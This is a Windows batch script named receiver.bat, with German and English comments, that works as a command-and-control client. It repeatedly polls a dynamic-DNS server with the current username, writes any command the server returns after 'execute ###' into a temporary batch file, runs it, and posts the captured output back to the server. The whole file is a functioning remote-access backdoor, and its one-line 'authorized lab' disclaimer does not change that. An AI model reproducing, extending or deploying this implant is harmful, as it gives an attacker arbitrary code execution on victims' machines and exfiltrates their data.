@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: ------------------------------------------------------------------
:: receiver.bat - Debugging version
:: Logs: raw response, payload content, and payload output
:: Use only in an authorized test/lab environment.
:: ------------------------------------------------------------------

:: -------------------------
:: Konfiguration (anpassen)
:: -------------------------
set "URL=http://raupe.ddns.net/cdr"
set "USER=%USERNAME%"
set "POLL_DELAY=5"

:: Pfade/Dateien
set "LOGFILE=%TEMP%\receiver_log.txt"
set "RESP=%TEMP%\rx_resp.txt"
set "PAYLOAD=%TEMP%\rx_payload.bat"
set "OUT=%TEMP%\rx_out.txt"
set "SEND_RESULT=%TEMP%\rx_send_result.txt"

:: -------------------------
:: Startmeldung
:: -------------------------
call :log "[INFO] Starting receiver.bat (debug version)"
call :log "[INFO] Log file: %LOGFILE%"
echo ====================================================
echo [INFO] Starting receiver.bat (debug version)
echo [INFO] Log file: %LOGFILE%
echo ====================================================
echo.

:: -------------------------
:: Cleanup alte Temp-Dateien
:: -------------------------
if exist "%RESP%" del /Q "%RESP%" 2>nul
if exist "%PAYLOAD%" del /Q "%PAYLOAD%" 2>nul
if exist "%OUT%" del /Q "%OUT%" 2>nul
if exist "%SEND_RESULT%" del /Q "%SEND_RESULT%" 2>nul
call :log "[INFO] Cleaning temporary files..."
echo [INFO] Cleaning temporary files...
call :log "[INFO] Cleanup complete."
echo [INFO] Cleanup complete.
echo.

:: -------------------------
:: Haupt-Loop
:: -------------------------
:MAIN_LOOP
call :log "----------------------------------------------------"
call :log "[INFO] LOOP START (%DATE% %TIME%)"
echo ----------------------------------------------------
echo [INFO] LOOP START (%DATE% %TIME%)
echo.

:: 1) Hole Befehl vom Server (POST "USER ### GET")
powershell -NoProfile -Command ^
  "try { $body = '%USER% ### GET'; $r = Invoke-RestMethod -Uri '%URL%' -Method Post -Body $body -TimeoutSec 10; if ($null -eq $r) { '' } else { $r } } catch { $_.Exception.Message }" > "%RESP%" 2>&1

if errorlevel 1 (
  call :log "[WARN] PowerShell HTTP request finished with non-zero exit code."
  echo [WARN] PowerShell HTTP request finished with non-zero exit code.
)
:: 2) Log raw response for debugging
call :log "-----------------------------"
call :log "[DEBUG] RAW RESPONSE START"
if exist "%RESP%" (
  type "%RESP%" >> "%LOGFILE%"
) else (
  echo [DEBUG] RESP file missing >> "%LOGFILE%"
)
call :log "[DEBUG] RAW RESPONSE END"
call :log "-----------------------------"

:: --- Check prefix: skip if response starts with "output ###"
set "RESP_LINE="
if exist "%RESP%" (<"%RESP%" set /p RESP_LINE=)
setlocal DisableDelayedExpansion
set "CHECKLINE=%RESP_LINE%"
endlocal & set "CHECKLINE=%CHECKLINE%"


if /I "%CHECKLINE:~0,11%"=="output ### " (
echo ----------------------------------------------------
echo [INFO] Skipping execution because of prefix 'output ###'
echo [DEBUG] Full skipped line: %CHECKLINE%
echo ----------------------------------------------------
call :log "----------------------------------------------------"
call :log "[INFO] Skipping execution because of prefix 'output ###'"
call :log "[DEBUG] Full skipped line: %CHECKLINE%"
call :log "----------------------------------------------------"
timeout /t %POLL_DELAY% >nul
goto MAIN_LOOP
)

echo [INFO] Received response (logged). See %LOGFILE% for raw response.
echo.

:: 3) Extrahiere Payload und schreibe sichere Payload-Datei (literal)
powershell -NoProfile -Command ^ "try { $text = Get-Content -Raw -LiteralPath '%RESP%'; if ($text -match '(?s)execute ### (.*)') { $cmd = $Matches[1]; [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`n$cmd\", [System.Text.Encoding]::ASCII) } else { [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`necho __NO_PAYLOAD__\", [System.Text.Encoding]::ASCII) } } catch { [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`necho __ERROR_PARSING_RESPONSE__\", [System.Text.Encoding]::ASCII) }" 2>nul

powershell -Command "(Get-Content '%PAYLOAD%' -Raw) -replace '\\n', \"`n\" | Set-Content '%PAYLOAD%'"


if not exist "%PAYLOAD%" (
  call :log "[ERROR] Payload file could not be created."
  echo [ERROR] Payload file could not be created.
  timeout /t %POLL_DELAY% >nul
  goto :MAIN_LOOP
)

:: 4) Log payload content (for debugging)
call :log "-----------------------------"
call :log "[DEBUG] PAYLOAD FILE CONTENT START (%PAYLOAD%)"
for /f "usebackq delims=" %%L in ("%PAYLOAD%") do (
  echo %%L >> "%LOGFILE%"
)
call :log "[DEBUG] PAYLOAD FILE CONTENT END"
call :log "-----------------------------"

echo [INFO] Payload written and logged. Preview:
type "%PAYLOAD%" | more
echo.

:: 5) Execute the payload robustly and capture stdout+stderr in %OUT%
if exist "%OUT%" del /Q "%OUT%" 2>nul

rem Run in separate cmd instance to avoid parser interference
cmd.exe /D /S /C ""%PAYLOAD%"" > "%OUT%" 2>&1
set "RC=%ERRORLEVEL%"

rem 6) Ensure %OUT% exists and contains useful info
if not exist "%OUT%" (
  echo [ERROR] No output file created by payload execution. ExitCode=%RC% > "%OUT%"
  call :log "[WARN] No %OUT% created; wrote fallback message (ExitCode=%RC%)."
) else (
  for %%I in ("%OUT%") do set "OUTSIZE=%%~zI"
  if "%OUTSIZE%"=="0" (
    (
      echo [INFO] Payload executed but produced no output. ExitCode=%RC%.
    ) >> "%OUT%"
    call :log "[INFO] %OUT% existed but was empty; appended notice (ExitCode=%RC%)."
  )
)

call :log "[INFO] Payload execution finished (exit code %RC%)."
echo [INFO] Execution finished (exit code %RC%).

:: 7) Log the full payload output for debugging
call :log "-----------------------------"
call :log "[DEBUG] PAYLOAD OUTPUT START (%OUT%)"
if exist "%OUT%" (
  type "%OUT%" >> "%LOGFILE%"
) else (
  echo [DEBUG] OUT file missing >> "%LOGFILE%"
)
call :log "[DEBUG] PAYLOAD OUTPUT END"
call :log "-----------------------------"

echo [INFO] Payload output logged. See %LOGFILE%.
echo.

:: 8) Send the output back to server (POST "USER ### POST"+output)
powershell -NoProfile -Command ^
  "try { $out = 'output ### ' + (Get-Content -Raw -LiteralPath '%OUT%'); if ($null -eq $out -or $out -eq '') { $out = '__NO_OUTPUT__' }; $body = '%USER% ### '+$out; Invoke-RestMethod -Uri '%URL%' -Method Post -Body $body -TimeoutSec 15; Write-Output 'OK' } catch { Write-Output ('ERR: ' + $_.Exception.Message) }" > "%SEND_RESULT%" 2>&1

for /f "usebackq delims=" %%S in ("%SEND_RESULT%") do set "SENDRESULT=%%S" & goto :got_sendresult
:got_sendresult
if defined SENDRESULT (
  call :log "[INFO] Results send back: %SENDRESULT%"
  echo [INFO] Results successfully sent. (%SENDRESULT%)
) else (
  call :log "[WARN] No send result captured."
  echo [WARN] No send result captured.
)

echo.
call :log "[INFO] Waiting %POLL_DELAY%s before next check..."
echo [INFO] Waiting %POLL_DELAY%s before next check...
timeout /t %POLL_DELAY% >nul

goto :MAIN_LOOP

:: -------------------------
:: Funktionsdefinitionen
:: -------------------------
:log
rem Parameter: %~1 = Text
set "TS=%DATE% %TIME%"
if "%~1"=="" (
  echo [%TS%] [LOG] (empty message) >> "%LOGFILE%"
) else (
  echo [%TS%] %~1 >> "%LOGFILE%"
)
goto :eof

endlocal
